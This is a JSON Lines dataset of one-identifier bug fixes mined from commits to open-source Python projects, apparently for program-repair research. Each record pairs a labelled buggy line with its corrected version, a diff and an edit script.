{"project": "PyBitmessage", "commit_sha": "cc4c07025b46f25496a3b49bea01b54d9bc7dcf9", "parent_sha": "8d278182a7da9aa4f012fa7decf348322ab323f6", "file_path": "src/class_sendDataThread.py", "project_url": "https://github.com/yguy2/PyBitmessage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class sendDataThread(threading.Thread):\n                             uploadRateLimitBytes = BMConfigParser().getint('bitmessagesettings', 'maxuploadrate') * 1000\n                 if ((self.services & protocol.NODE_SSL == protocol.NODE_SSL) and\n                     self.connectionIsOrWasFullyEstablished and\n-                    shared.haveSSL(not self.initiatedConnection)):\n+                    protocol.haveSSL(not self.initiatedConnection)):\n                     amountSent = self.sslSock.send(data[:1000])\n                 else:\n                     amountSent = self.sock.send(data[:1000])\n", "before": "if ( ( self . services & protocol . NODE_SSL == protocol . NODE_SSL ) and self . connectionIsOrWasFullyEstablished and shared . haveSSL ( not self . initiatedConnection ) ) : amountSent = self . sslSock . send ( data [ : 1000 ] ) else : amountSent = self . sock . send ( data [ : 1000 ] )", "after": "if ( ( self . services & protocol . NODE_SSL == protocol . NODE_SSL ) and self . connectionIsOrWasFullyEstablished and protocol . haveSSL ( not self . initiatedConnection ) ) : amountSent = self . sslSock . send ( data [ : 1000 ] ) else : amountSent = self . sock . send ( data [ : 1000 ] )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:shared\", 3, 21, 3, 27], \"protocol\"]]"}
{"project": "Distributed_Microblog_Spider", "commit_sha": "ecefbf6abafa091950bbfd50987435e855a4b631", "parent_sha": "1b54dd5ef14c7dea89acdce3c2951cc28219bc61", "file_path": "server_database.py", "project_url": "https://github.com/multiangle/Distributed_Microblog_Spider", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -223,7 +223,7 @@ class deal_cache_history(threading.Thread):\n             query='select * from cache_history where is_dealing is null order by checkin_timestamp limit 1'\n \n             mysql_res=dbi.select_asQuery(query)\n-            if res.__len__()==0:       # cache_history\u8868\u4e3a\u7a7a\u65f6\uff0c\u7761\u77201\u79d2,\u8df3\u8fc7\u6b64\u6b21\u5faa\u73af\n+            if mysql_res.__len__()==0:       # cache_history\u8868\u4e3a\u7a7a\u65f6\uff0c\u7761\u77201\u79d2,\u8df3\u8fc7\u6b64\u6b21\u5faa\u73af\n                 time.sleep(1)\n                 continue\n \n", "before": "if res . __len__ ( ) == 0 : time . sleep ( 1 ) continue", "after": "if mysql_res . __len__ ( ) == 0 : time . sleep ( 1 ) continue", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:res\", 3, 16, 3, 19], \"mysql_res\"]]"}
{"project": "nutils", "commit_sha": "e459e65841e3f1de8bf63543da36c2cdae1b7633", "parent_sha": "03afd997783b290e1cb50544bd7506ab65702321", "file_path": "nutils/rational.py", "project_url": "https://github.com/evalf/nutils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ class Rational( object ):\n     if not isinstance( numer, numpy.ndarray ):\n       numer = numpy.array( numer )\n       if not numer.size:\n-        numer = numpy.astype( int )\n+        numer = numer.astype( int )\n       numer.flags.writeable = False\n     assert isint(numer)\n     if not numer.size:\n", "before": "numer = numpy . astype ( int )", "after": "numer = numer . astype ( int )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:numpy\", 3, 17, 3, 22], \"numer\"]]"}
{"project": "arlpy", "commit_sha": "1bd29b7f2692379e7cff6b0d27c069c8869732aa", "parent_sha": "48d8bf8ffa91776043e4306ba7f93af9aa3cdbee", "file_path": "arlpy/uwapm.py", "project_url": "https://github.com/org-arl/arlpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -594,7 +594,7 @@ class _Bellhop:\n \n     def _unlink(self, f):\n         try:\n-            os.unlink(f)\n+            _os.unlink(f)\n         except:\n             pass\n \n", "before": "os . unlink ( f )", "after": "_os . unlink ( f )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:os\", 3, 13, 3, 15], \"_os\"]]"}
{"project": "cloud-init", "commit_sha": "7baf9f31b2bc5ae74bb1e0897f9fc28992ccef40", "parent_sha": "f7a686995be8b729ab46a98835c7a3d578dc4b39", "file_path": "cloudinit/sources/DataSourceOVF.py", "project_url": "https://github.com/rightscale/cloud-init", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -213,7 +213,7 @@ def transport_iso9660(require_iso=True):\n             (fname, contents) = util.mount_cb(fullp,\n                                                get_ovf_env, mtype=\"iso9660\")\n         except util.MountFailedError:\n-            log.debug(\"%s not mountable as iso9660\" % fullp)\n+            LOG.debug(\"%s not mountable as iso9660\" % fullp)\n \n         if contents is not False:\n             return (contents, fullp, fname)\n", "before": "except util . MountFailedError : log . debug ( \"%s not mountable as iso9660\" % fullp )", "after": "except util . MountFailedError : LOG . debug ( \"%s not mountable as iso9660\" % fullp )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:log\", 3, 13, 3, 16], \"LOG\"]]"}
{"project": "Sverchok", "commit_sha": "bf572e69f44c4d9c8ac7482777cc3e075458bb3a", "parent_sha": "150fc783ea41c3ae07efc72c3a3d651e15acbe60", "file_path": "core/socket.py", "project_url": "https://github.com/Sverchok/Sverchok", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -136,7 +136,7 @@ def replace_socket(socket, new_type=None, new_name=None, settings=None):\n         inputs.remove(socket)\n         new_socket = inputs.new(socket_type, socket_name)\n         inputs.move(len(inputs)-1, socket_pos)\n-        socket.setup(settings)\n+        new_socket.setup(settings)\n \n         if from_socket:\n             ng.links.new(from_socket, new_socket)\n", "before": "socket . setup ( settings )", "after": "new_socket . setup ( settings )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:socket\", 3, 9, 3, 15], \"new_socket\"]]"}
{"project": "gunicorn", "commit_sha": "70b962e626904f955bb05b8199f71282a5c349a8", "parent_sha": "2ab4bbf46f8d00ce454128116bc2ed7f6fec38b8", "file_path": "gunicorn/http/_sendfile.py", "project_url": "https://github.com/canvasnetworks/gunicorn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,6 +61,6 @@ def sendfile(fdout, fdin, offset, nbytes):\n         _offset = ctypes.c_uint64(offset)\n         sent = _sendfile(fdout, fdin, _offset, nbytes) \n         if sent == -1:\n-            e = ctypess.get_errno()\n+            e = ctypes.get_errno()\n             raise OSError(e, os.strerror(e))\n         return sent\n", "before": "e = ctypess . get_errno ( )", "after": "e = ctypes . get_errno ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:ctypess\", 3, 17, 3, 24], \"ctypes\"]]"}
{"project": "GalSim", "commit_sha": "217ef46758d7a2ecf4f1319123aa5125f1f4f002", "parent_sha": "ad7fa30e29a86a7dbbf230ab9ae24772d388ef09", "file_path": "galsim/config.py", "project_url": "https://github.com/mardom/GalSim", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ def load(config_file=None, include_default=True):\n     else:\n         files =[]\n     if config_file != None:\n-        file.append(config_file)\n+        files.append(config_file)\n     for f in reversed(files):\n         execfile(f)\n     return config\n", "before": "file . append ( config_file )", "after": "files . append ( config_file )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:file\", 3, 9, 3, 13], \"files\"]]"}
{"project": "openalea", "commit_sha": "f7b85a238f03671ff0a361ee06755d3b72742db0", "parent_sha": "8be4771a6573fc4b5c4f2142ead3d75194ec865a", "file_path": "visualea/src/visualea/node_widget.py", "project_url": "https://github.com/VirtualPlants/openalea", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -236,7 +236,7 @@ class IFileStrWidget(IStrWidget):\n \n-        StrNodeWidget.__init__(self, node, parent, parameter_str)\n+        IStrWidget.__init__(self, node, parent, parameter_str)\n \n         self.button = QtGui.QPushButton(\"...\", self)\n         self.hboxlayout.addWidget(self.button)\n", "before": "StrNodeWidget . __init__ ( self , node , parent , parameter_str )", "after": "IStrWidget . __init__ ( self , node , parent , parameter_str )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:StrNodeWidget\", 1, 9, 1, 22], \"IStrWidget\"]]"}
{"project": "suds-jurko", "commit_sha": "42748cf04c7182fc89917f8c425446fd6e5279f8", "parent_sha": "466f91b67cb4a984cea93259107f1b6d600b3bf3", "file_path": "suds/wsse.py", "project_url": "https://github.com/Affirm/suds-jurko", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -94,7 +94,7 @@ class Token(Object):\n \n     @classmethod\n     def sysdate(cls):\n-        utc = DateTime(self.utc())\n+        utc = DateTime(cls.utc())\n         return str(utc)\n \n     def __init__(self):\n", "before": "utc = DateTime ( self . utc ( ) )", "after": "utc = DateTime ( cls . utc ( ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:self\", 3, 24, 3, 28], \"cls\"]]"}
{"project": "pandas-084B", "commit_sha": "4df08a9d9fcb679410743b97851899d60776b3b1", "parent_sha": "576f3190ad81d9e20d7ef0a7ce41c1eb52ff5a5c", "file_path": "scripts/merge-py.py", "project_url": "https://github.com/17-1-SKKU-OSS/pandas-084B", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -116,7 +116,7 @@ def clean_up():\n \n     branches = run_cmd(\"git branch\").replace(\" \", \"\").split(\"\\n\")\n \n-    for branch in [b for b in branches if x.startswith(BRANCH_PREFIX)]:\n+    for branch in [b for b in branches if b.startswith(BRANCH_PREFIX)]:\n         print(\"Deleting local branch %s\" % branch)\n         run_cmd(\"git branch -D %s\" % branch)\n \n", "before": "for branch in [ b for b in branches if x . startswith ( BRANCH_PREFIX ) ] : print ( \"Deleting local branch %s\" % branch ) run_cmd ( \"git branch -D %s\" % branch )", "after": "for branch in [ b for b in branches if b . startswith ( BRANCH_PREFIX ) ] : print ( \"Deleting local branch %s\" % branch ) run_cmd ( \"git branch -D %s\" % branch )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:x\", 3, 43, 3, 44], \"b\"]]"}
{"project": "dask-launcher", "commit_sha": "3c14118b16058c407ef8f872f8c7991ff622a790", "parent_sha": "0ba6759a540d3d54f2e92841d27f299a033d3572", "file_path": "launcher/bin/paramrun.py", "project_url": "https://github.com/poldracklab/dask-launcher", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -51,7 +51,7 @@ def main():\n     # Environment: Setup work directory and variables\n     job_id = os.getenv('SLURM_JOBID')\n     os.chdir(os.getenv('DLAUNCH_WORKDIR', os.getcwd()))\n-    rmi_dir = os.abspath('.dlauncher-rmi-%s' % job_id)\n+    rmi_dir = op.abspath('.dlauncher-rmi-%s' % job_id)\n     os.mkdirs(rmi_dir, exist_ok=True)\n     sched_file = op.join(rmi_dir, DLAUNCH_SCHEDFILE + '.json')\n     nodes = sp.run(['scontrol', 'show', 'hostname', os.getenv('SLURM_NODELIST')],\n", "before": "rmi_dir = os . abspath ( '.dlauncher-rmi-%s' % job_id )", "after": "rmi_dir = op . abspath ( '.dlauncher-rmi-%s' % job_id )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:os\", 3, 15, 3, 17], \"op\"]]"}
{"project": "sverchok", "commit_sha": "7b3df16ea6f185e2482e722cf3b3e5d6870de6fa", "parent_sha": "1e3cc85761149df56312bddee321e9d2c0c744b8", "file_path": "__init__.py", "project_url": "https://github.com/faerietree/sverchok", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -256,7 +256,7 @@ def unregister():\n     node_Tools.unregister()\n     node_Formula2.unregister()\n     node_Formula.unregister()\n-    node_MatrixShearNode.register()\n+    node_MatrixShear.register()\n     node_MatrixDestructor.unregister()\n     node_MatrixGenerator.unregister()\n     node_MatrixDeform.unregister()\n", "before": "node_MatrixShearNode . register ( )", "after": "node_MatrixShear . register ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:node_MatrixShearNode\", 3, 5, 3, 25], \"node_MatrixShear\"]]"}
{"project": "astropy", "commit_sha": "a09c419b134c9f3e0b51ddd82382b78eb0794aaf", "parent_sha": "212f2979d3b71828994588c55084f651defc1351", "file_path": "astropy/utils/iers/iers.py", "project_url": "https://github.com/mirca/astropy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ def download_file(*args, **kwargs):\n     kwargs.setdefault('http_headers', {'User-Agent': 'astropy/iers',\n                                        'Accept': '*/*'})\n-    kwarg.setdefault('ftp_tls', True)\n+    kwargs.setdefault('ftp_tls', True)\n \n     with utils.data.conf.set_temp('remote_timeout', conf.remote_timeout):\n         return utils.data.download_file(*args, **kwargs)\n", "before": "kwarg . setdefault ( 'ftp_tls' , True )", "after": "kwargs . setdefault ( 'ftp_tls' , True )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:kwarg\", 2, 5, 2, 10], \"kwargs\"]]"}
{"project": "gutMicrobiome", "commit_sha": "009d45596eb02ed6f8ed35434aa1a6ab128143ae", "parent_sha": "a91f985690ea8e8d9cf5bf8010d3c31f3a94d64e", "file_path": "snakemake/persistence.py", "project_url": "https://github.com/tianyabeef/gutMicrobiome", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class Persistence:\n \n     def lock_warn_only(self):\n         if self.locked:\n-            logging.info(\"Error: Directory cannot be locked. This usually \"\n+            logger.info(\"Error: Directory cannot be locked. This usually \"\n             \"means that another Snakemake instance is running on this directory.\"\n             \"Another possiblity is that a previous run exited unexpectedly.\")\n \n", "before": "logging . info ( \"Error: Directory cannot be locked. This usually \" \"means that another Snakemake instance is running on this directory.\" \"Another possiblity is that a previous run exited unexpectedly.\" )", "after": "logger . info ( \"Error: Directory cannot be locked. This usually \" \"means that another Snakemake instance is running on this directory.\" \"Another possiblity is that a previous run exited unexpectedly.\" )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:logging\", 3, 13, 3, 20], \"logger\"]]"}
{"project": "gutMicrobiome", "commit_sha": "c8275683fd7054cc7d60726baec40f52b1965d11", "parent_sha": "a4361042e95ce8af29ac5a566e9e38d061255661", "file_path": "snakemake/dag.py", "project_url": "https://github.com/tianyabeef/gutMicrobiome", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -443,7 +443,7 @@ class DAG:\n                 if newrule_ is not None:\n                     self.replace_rule(job_.rule, newrule_)\n                     if not self.dynamic(job_):\n-                        logging.debug(\"Updating job {}.\".format(job_))\n+                        logger.debug(\"Updating job {}.\".format(job_))\n                         newjob_ = Job(newrule_, targetfile=job_.targetfile)\n                         self.replace_job(job_, newjob_)\n         return newjob\n", "before": "logging . debug ( \"Updating job {}.\" . format ( job_ ) )", "after": "logger . debug ( \"Updating job {}.\" . format ( job_ ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:logging\", 3, 25, 3, 32], \"logger\"]]"}
{"project": "nltk", "commit_sha": "5bbf4a16c93810955c3d7ba878f4cfb2271b06a1", "parent_sha": "597b991fb9ad1d761ca0931c9178b44a486acc7f", "file_path": "nltk/tgrep.py", "project_url": "https://github.com/uda/nltk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -621,7 +621,7 @@ def _build_tgrep_parser(set_parse_actions = True):\n                    tgrep_expr2 +\n                    pyparsing.ZeroOrMore(';' + (macro_defn | tgrep_expr)))\n     if set_parse_actions:\n-        node_label_use.setParseAction(_tgrep_node_label_use_action)\n+        tgrep_node_label_use.setParseAction(_tgrep_node_label_use_action)\n         macro_use.setParseAction(_tgrep_macro_use_action)\n         tgrep_node.setParseAction(_tgrep_node_action)\n         tgrep_node_expr2.setParseAction(_tgrep_label_node_action)\n", "before": "node_label_use . setParseAction ( _tgrep_node_label_use_action )", "after": "tgrep_node_label_use . setParseAction ( _tgrep_node_label_use_action )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:node_label_use\", 3, 9, 3, 23], \"tgrep_node_label_use\"]]"}
{"project": "erpnext", "commit_sha": "9cad9439a1b7442e35cd9b6341f83df181256142", "parent_sha": "7597baab950183fdb3ac5c58eaa8b33b85353240", "file_path": "erpnext/education/setup.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -45,4 +45,4 @@ def create_student_role():\n \t\t\"desk_access\": 0,\n \t\t\"restrict_to_domain\": \"Education\"\n \t})\n-\tstudent.insert()\n+\tstudent_role.insert()\n", "before": "student . insert ( )", "after": "student_role . insert ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:student\", 3, 2, 3, 9], \"student_role\"]]"}
{"project": "erpnext", "commit_sha": "64d2fe0ad7d6fb9eb6e73915ebb526c3299869a3", "parent_sha": "4add826703cfb4f7686a57af43f7da66da1f011c", "file_path": "erpnext/www/lms.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -283,7 +283,7 @@ def get_quiz_progress(program_name):\n @frappe.whitelist(allow_guest=True)\n def get_course_details(course_name):\n \ttry:\n-\t\tcourse = sfrappe.get_doc('Course', course_name)\n+\t\tcourse = frappe.get_doc('Course', course_name)\n \t\treturn course\n \texcept:\n \t\treturn None\n", "before": "course = sfrappe . get_doc ( 'Course' , course_name )", "after": "course = frappe . get_doc ( 'Course' , course_name )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:sfrappe\", 3, 12, 3, 19], \"frappe\"]]"}
{"project": "AIS-home-assistant", "commit_sha": "74c249e57d16340ebd89fcd989942ff8b2fac26f", "parent_sha": "f8127a3902abaa6cb654ca7c28905adc81ee0623", "file_path": "homeassistant/components/media_player/spotify.py", "project_url": "https://github.com/sviete/AIS-home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -194,7 +194,7 @@ class SpotifyMediaPlayer(MediaPlayerDevice):\n             self._title = item.get('name')\n             self._artist = ', '.join([artist.get('name')\n                                       for artist in item.get('artists')])\n-            self._uri = current.get('uri')\n+            self._uri = item.get('uri')\n             images = item.get('album').get('images')\n             self._image_url = images[0].get('url') if images else None\n         # Playing state\n", "before": "self . _uri = current . get ( 'uri' )", "after": "self . _uri = item . get ( 'uri' )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:current\", 3, 25, 3, 32], \"item\"]]"}
{"project": "Multiplayer-snake-game", "commit_sha": "251f804014d4069b0f9c1713ba8d646e6a2b4978", "parent_sha": "98b41c70c55090350bfce349f1d092875779bfaa", "file_path": "sender/base.py", "project_url": "https://github.com/yrttyr/Multiplayer-snake-game", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -51,7 +51,7 @@ class Subscriber(Link, MutableMapping):\n         wr = get_wrapper(obj)\n         if wr in self.links:\n             self._unsubscribe(wr)\n-            obj._unsubscribe(self)\n+            wr._unsubscribe(self)\n \n     def __setitem__(self, key, value):\n         self._dict[key] = value\n", "before": "obj . _unsubscribe ( self )", "after": "wr . _unsubscribe ( self )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:obj\", 3, 13, 3, 16], \"wr\"]]"}
{"project": "arraypool", "commit_sha": "5111165e3278bdc83737cab530445658484bd104", "parent_sha": "d8386c21ce9e7959760125e8de2213ae064f142c", "file_path": "arrayvcf.py", "project_url": "https://github.com/markkaganovich/arraypool", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,9 +16,9 @@ def in1kg(poollines, names):\n \t\tif l in lines:\n \t\t\tresult.append(True)\n \t\telse:\n-\t\t\tresults.append(False)\n+\t\t\tresult.append(False)\n \treturn result\n-\t\n+\n def getlines(name):\n \tvfile = open(name, 'r')\n \tvcf_reader = vcf.Reader(vfile)\n", "before": "results . append ( False )", "after": "result . append ( False )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:results\", 3, 4, 3, 11], \"result\"]]"}
{"project": "firminator_backend", "commit_sha": "fdb3cba5c6d1899a61691bd9b71b24ba925b2122", "parent_sha": "45471409a1dc6c533952067d9886f6df3a3e4d6e", "file_path": "lib/tar2db.py", "project_url": "https://github.com/stevenchen0x01/firminator_backend", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ def createObjects(hashes, cur):\n def isBinary(filename):\n     #This is not good enough, must find a better solution\n     with open(filename, 'rb') as file:\n-        bytes = f.read(4)\n+        bytes = file.read(4)\n         return (bytes == b'\\x7f\\x45\\x4c\\x46') # check if first 4 bytes are \"7f E L F\"\n \n #Robin: this is unstable, makes my vm crash everytime so I put it here and put the old isBinary back...\n", "before": "bytes = f . read ( 4 )", "after": "bytes = file . read ( 4 )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:f\", 3, 17, 3, 18], \"file\"]]"}
{"project": "HyperGAN", "commit_sha": "f164d2f9288685c24eeeabcd7213cec727835bef", "parent_sha": "4ef956d7385959b904eee42a15e5a1c850f33a91", "file_path": "hypergan/config.py", "project_url": "https://github.com/mtyka/HyperGAN", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ def selector(args):\n     # Discriminator configuration\n     discriminators = []\n     for i in range(1):\n-        discriminators.append(pyramid_nostride_discriminator.config(layers=5))\n+        discriminators.append(pyramid_nostride_fc_discriminator.config(layers=5))\n     selector.set(\"discriminators\", [discriminators])\n \n     # Sampler configuration\n", "before": "discriminators . append ( pyramid_nostride_discriminator . config ( layers = 5 ) )", "after": "discriminators . append ( pyramid_nostride_fc_discriminator . config ( layers = 5 ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:pyramid_nostride_discriminator\", 3, 31, 3, 61], \"pyramid_nostride_fc_discriminator\"]]"}
{"project": "w3af", "commit_sha": "41f447a9f672ade3257a39903452e7894529ce9f", "parent_sha": "9efdd2953921872c76962669742328054a1d38c9", "file_path": "plugins/grep/objects.py", "project_url": "https://github.com/stevenchen0x01/w3af", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ class objects(baseGrepPlugin):\n                 i.setName('Applet tag')\n                 i.setURL( response.getURL() )\n                 i.setId( response.id )\n-                i.setDesc( \"The URL : \" + v.getURL() + \" has an applet tag.\" )          \n+                i.setDesc( \"The URL : \" + i.getURL() + \" has an applet tag.\" )          \n                 kb.kb.append( self, 'applet', i )\n                 self._alreadyAddedApplet.append( response.getURL() )\n     \n", "before": "i . setDesc ( \"The URL : \" + v . getURL ( ) + \" has an applet tag.\" )", "after": "i . setDesc ( \"The URL : \" + i . getURL ( ) + \" has an applet tag.\" )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:v\", 3, 43, 3, 44], \"i\"]]"}
{"project": "w3af", "commit_sha": "2ba973162a6d51b160b3a787c3f516e047b348ee", "parent_sha": "1c339351f061f920da64166759bae06f78aa6487", "file_path": "plugins/audit/blindSqli.py", "project_url": "https://github.com/stevenchen0x01/w3af", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -83,7 +83,7 @@ class blindSqli(baseAuditPlugin):\n                 time_delay = \\\n                     self._blind_sqli_time_delay.is_injectable(freq, parameter)\n                 if time_delay is not None and \\\n-                    kb_has_no_bsqli(vuln_resp_diff.getVar()):\n+                    kb_has_no_bsqli(time_delay.getVar()):\n                     om.out.vulnerability(time_delay.getDesc())\n                     kb.kb.append(self, 'blindSqli', time_delay)\n     \n", "before": "if time_delay is not None and kb_has_no_bsqli ( vuln_resp_diff . getVar ( ) ) : om . out . vulnerability ( time_delay . getDesc ( ) ) kb . kb . append ( self , 'blindSqli' , time_delay )", "after": "if time_delay is not None and kb_has_no_bsqli ( time_delay . getVar ( ) ) : om . out . vulnerability ( time_delay . getDesc ( ) ) kb . kb . append ( self , 'blindSqli' , time_delay )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:vuln_resp_diff\", 3, 37, 3, 51], \"time_delay\"]]"}
{"project": "invenio", "commit_sha": "1e19e1aa76ccab23561d4805529269c29e81101f", "parent_sha": "4ece53febb1fb107fd69e7861c8aa958c1aeb1ba", "file_path": "modules/bibformat/lib/bibformat_utils.py", "project_url": "https://github.com/fpoli/invenio", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -613,7 +613,7 @@ def get_pdf_snippets(recID, patterns, user_info):\n             break # stop at the first good PDF textable file\n \n     nb_chars = CFG_WEBSEARCH_FULLTEXT_SNIPPETS_CHARS.get('', 0)\n-    max_snippets = CFG_WEBSEARCH_FULLTEXT_SNIPPETS_CHARS.get('', 0)\n+    max_snippets = CFG_WEBSEARCH_FULLTEXT_SNIPPETS.get('', 0)\n     if CFG_WEBSEARCH_FULLTEXT_SNIPPETS_CHARS.has_key(text_path_courtesy):\n         nb_chars=CFG_WEBSEARCH_FULLTEXT_SNIPPETS_CHARS[text_path_courtesy]\n     if CFG_WEBSEARCH_FULLTEXT_SNIPPETS.has_key(text_path_courtesy):\n", "before": "max_snippets = CFG_WEBSEARCH_FULLTEXT_SNIPPETS_CHARS . get ( '' , 0 )", "after": "max_snippets = CFG_WEBSEARCH_FULLTEXT_SNIPPETS . get ( '' , 0 )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:CFG_WEBSEARCH_FULLTEXT_SNIPPETS_CHARS\", 3, 20, 3, 57], \"CFG_WEBSEARCH_FULLTEXT_SNIPPETS\"]]"}
{"project": "qutebrowser", "commit_sha": "4909f3f0fe7c015e0cde4714f1623d9cdb572c85", "parent_sha": "0fa309e2a4bc75246abc6f78205581ac5596e0e0", "file_path": "qutebrowser/utils/log.py", "project_url": "https://github.com/ludat/qutebrowser", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -95,7 +95,7 @@ def init_log(args):\n         root.addHandler(console)\n     if ram is not None:\n         root.addHandler(ram)\n-        console.addFilter(LeplFilter())\n+        ram.addFilter(LeplFilter())\n     root.setLevel(logging.NOTSET)\n     logging.captureWarnings(True)\n     qInstallMessageHandler(qt_message_handler)\n", "before": "console . addFilter ( LeplFilter ( ) )", "after": "ram . addFilter ( LeplFilter ( ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:console\", 3, 9, 3, 16], \"ram\"]]"}
{"project": "qutebrowser", "commit_sha": "2777e4113e707a11196756bfe80f3c0e9380ac5e", "parent_sha": "8aec5244de7e3a50310da83df690ad1b1b0ae697", "file_path": "qutebrowser/app.py", "project_url": "https://github.com/ludat/qutebrowser", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -622,7 +622,7 @@ class Quitter:\n-        qApp.shutdown(session=name)\n+        self.shutdown(session=name)\n \n \n class Application(QApplication):\n", "before": "qApp . shutdown ( session = name )", "after": "self . shutdown ( session = name )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:qApp\", 0, 9, 0, 13], \"self\"]]"}
{"project": "buildbot", "commit_sha": "f019ab0cb80e14b3a3058907568ad1bfa723e392", "parent_sha": "1059420435083c830c9838bcefa24017b153b02f", "file_path": "master/buildbot/status/web/logs.py", "project_url": "https://github.com/sigma-star/buildbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ class TextLog(Resource):\n         if path == \"text\":\n             self.asText = True\n             return self\n-        return HtmlResource.getChild(self, path, req)\n+        return Resource.getChild(self, path, req)\n \n     def content(self, entries):\n         html_entries = []\n", "before": "return HtmlResource . getChild ( self , path , req )", "after": "return Resource . getChild ( self , path , req )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:HtmlResource\", 3, 16, 3, 28], \"Resource\"]]"}
{"project": "buildbot", "commit_sha": "d00f6a9819b4a43b77db294e5ebbc5bfa70d8f6a", "parent_sha": "e3d3e8e18da8f234a5779b4e93b891ea066756ce", "file_path": "master/buildbot/monkeypatches/__init__.py", "project_url": "https://github.com/sigma-star/buildbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,4 +82,4 @@ def patch_all(for_tests=False):\n         from buildbot.monkeypatches import testcase_patch\n         testcase_patch.patch_testcase_patch()\n         from buildbot.monkeypatches import testcase_synctest\n-        testcase_defer.patch_testcase_synctest()\n+        testcase_synctest.patch_testcase_synctest()\n", "before": "testcase_defer . patch_testcase_synctest ( )", "after": "testcase_synctest . patch_testcase_synctest ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:testcase_defer\", 3, 9, 3, 23], \"testcase_synctest\"]]"}
